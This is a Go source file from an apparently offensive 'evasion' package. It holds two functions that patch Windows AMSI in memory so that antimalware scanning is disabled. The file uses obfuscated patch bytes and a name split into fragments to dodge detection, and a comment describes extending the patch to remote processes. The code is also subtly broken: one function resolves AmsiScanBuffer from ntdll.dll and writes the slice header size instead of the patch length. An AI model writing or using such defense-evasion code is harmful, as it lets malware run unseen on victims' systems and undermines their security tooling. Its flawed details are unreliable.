package evasion

import (
	"golang.org/x/sys/windows"
	"unsafe"
)

var amsi_patch = []byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1}

func PatchAmsi() error {
  AmsiScanBuffer := windows.NewLazyDLL("ntdll.dll").NewProc("AmsiScanBuffer")
  ntdll := windows.NewLazyDLL("ntdll.dll")
  NtWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
  NtProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")

  baseAddress := AmsiScanBuffer.Addr()
  numberOfBytesToProtect := uintptr(len(amsi_patch))
  var oldProtect uintptr

  r1, _, err := NtProtectVirtualMemory.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&baseAddress)), uintptr(unsafe.Pointer(&numberOfBytesToProtect)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
  if r1 != 0 {
    return err
  }

  NtWriteVirtualMemory.Call(uintptr(0xffffffffffffffff), AmsiScanBuffer.Addr(), uintptr(unsafe.Pointer(&amsi_patch[0])), unsafe.Sizeof(amsi_patch), 0)

  r2, _, err := NtProtectVirtualMemory.Call(uintptr(0xffffffffffffffff), uintptr(unsafe.Pointer(&baseAddress)), uintptr(unsafe.Pointer(&numberOfBytesToProtect)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
  if r2 != 0 {
    return err
  }

  return nil
}

func PatchAmsi2() error {
  kernel32 := windows.NewLazyDLL("kernel32.dll")
  //OpenProcess := kernel32.NewProc("OpenProcess")
  GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")

  ntdll := windows.NewLazyDLL("ntdll.dll")
  NtProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
  NtWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")

  amsi := windows.NewLazyDLL("amsi.dll")
  AmsiOpenSession := amsi.NewProc("Am" + "siOp" + "enS" + "essi" + "on")

  patch := []byte{0x75}

  var oldProtect uint32
  var memPage uintptr = 0x1000

  pHandle, _, _ := GetCurrentProcess.Call()
  // this can be modified to allow remote process AMSI patching
  //pHandle, _, _ := OpenProcess.Call(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE, uintptr(0), uintptr(pid))

  addr := AmsiOpenSession.Addr()
  addr2 := AmsiOpenSession.Addr()

  for i := 0; i < 1024; i++ {
    if *(*byte)(unsafe.Pointer(addr + uintptr(i))) == 0x74 {
      addr = addr + uintptr(1)
      break
    }
  }

  r1, _, err := NtProtectVirtualMemory.Call(uintptr(pHandle), uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&memPage)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
  if r1 != 0 {
    return err
  }

  for i := 0; i < 1024; i++ {
    if *(*byte)(unsafe.Pointer(addr2 + uintptr(i))) == 0x74 {
      addr2 = addr2 + uintptr(1)
      break
    }
  }

  var regionsize uintptr
  NtWriteVirtualMemory.Call(uintptr(pHandle), addr2, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), uintptr(unsafe.Pointer(&regionsize)))

  r2, _, err := NtProtectVirtualMemory.Call(uintptr(pHandle), uintptr(unsafe.Pointer(&addr2)), uintptr(unsafe.Pointer(&memPage)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
  if r2 != 0 {
    return err
  }

  return nil
}

